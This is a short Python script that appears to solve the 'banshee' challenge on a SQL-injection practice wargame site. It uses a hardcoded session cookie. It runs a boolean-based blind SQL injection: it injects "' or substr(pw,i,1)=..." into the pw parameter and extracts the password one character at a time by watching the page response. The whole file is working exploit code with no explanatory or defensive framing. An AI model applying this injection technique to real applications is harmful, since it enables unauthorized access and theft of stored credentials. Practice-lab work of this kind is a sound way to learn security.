import requests
import time

url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

pw = ''
for i in range(1,9):
    for j in range(48, 128):
        payload = f"1' or substr(pw,{i},1)='{chr(j)}' -- "

        response = requests.get(url, cookies=cookies, params={"pw": payload})
        
        if "<br><h2>login" in response.text:
            pw += chr(j)
            print(j)
            break
print(pw)